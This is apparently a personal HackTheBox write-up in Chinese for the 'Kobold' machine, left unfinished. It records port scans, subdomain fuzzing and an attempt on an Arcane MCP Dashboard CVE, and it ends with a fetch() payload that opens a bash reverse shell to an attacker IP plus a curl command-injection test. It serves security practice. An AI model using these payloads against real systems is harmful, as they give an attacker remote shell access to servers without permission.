---
layout: post
title: "HackTheBox - Kobold"
date: 2026-03-24
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Kobold
<!-- more -->

這一題還沒有解出來，但先紀錄一下，做了哪些操作

## Recon
因為網路的關係，需要先把host加入到`C:\Windows\System32\drivers\etc\host`中，不管是找到多少subdomain都要加入
```text
10.129.11.134 kobold.htb mcp.kobold.htb bin.kobold.htb
```

### Port Scanning
```bash
$ nmap -p- -T4 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:06 CST
Warning: 10.129.11.134 giving up on port because retransmission cap hit (6).
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.20s latency).
Not shown: 65291 closed ports, 240 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver

Nmap done: 1 IP address (1 host up) scanned in 1121.49 seconds
nmap -p 3552 -sC -sV 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:26 CST
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.26s latency).

PORT     STATE SERVICE   VERSION
3552/tcp open  taserver?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Mon, 23 Mar 2026 17:26:48 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|     <link rel="modu
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Mon, 23 Mar 2026 17:26:49 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|_    <link rel="modu
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3552-TCP:V=7.80%I=7%D=3/24%Time=69C177D7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate
SF:\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=u
SF:tf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2023\x20
SF:Mar\x202026\x2017:26:48\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang
SF:=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta
SF:\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x2
SF:0must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content
SF:=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0
SF:\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"
SF:\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\
SF:n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\
SF:t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20m
SF:edia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"
SF:theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20m
SF:edia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20re
SF:l=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate
SF:\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=u
SF:tf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2023\x20
SF:Mar\x202026\x2017:26:49\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang
SF:=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta
SF:\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x2
SF:0must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content
SF:=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0
SF:\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"
SF:\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\
SF:n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\
SF:t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20m
SF:edia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"
SF:theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20m
SF:edia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20re
SF:l=\"modu");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.23 seconds
$ nmap -p 8080 -sC -sV 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:29 CST
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.19s latency).

PORT     STATE  SERVICE    VERSION
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```
所以他有幾個常見的port，但3552這一個port很奇怪
```
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
8080/tcp closed http-proxy
```
實際從browser request會發現是arcane MCP

### Subdomain Scanning
```bash
$ ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -k -fs 154

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb
 :: Wordlist         : FUZZ: /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]
bin                     [Status: 200, Size: 24392, Words: 1218, Lines: 386]
:: Progress: [19966/19966] :: Job [1/1] :: 199 req/sec :: Duration: [0:01:40] :: Errors: 0 ::
$ ffuf -u https://mcp.kobold.htb/FUZZ -w /snap/seclists/1214//Discovery/Web-Content/common.txt -k
```
有兩個subdomain
```text
bin.kobold.htb
mcp.kobold.htb
```
然後在網路上看到Arcane MCP Dashboard的CVE([CVE-2026-23520 Detail](https://nvd.nist.gov/vuln/detail/CVE-2026-23520))
```javascript
fetch("/api/mcp/connect", {method: "POST", headers:{"Content-Type":"application/json"},body: JSON.stringify({serverId:"pwn",serverConfig:{command:"bash",args:["-c","bash -i >& /dev/tcp/10.10.15.48/4444 0>&1"],env:{}}})})

```
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverId":"pwn", "serverConfig":{"command":"bash", "args": ["-c", "sleep 5"],"env": {}}}'
```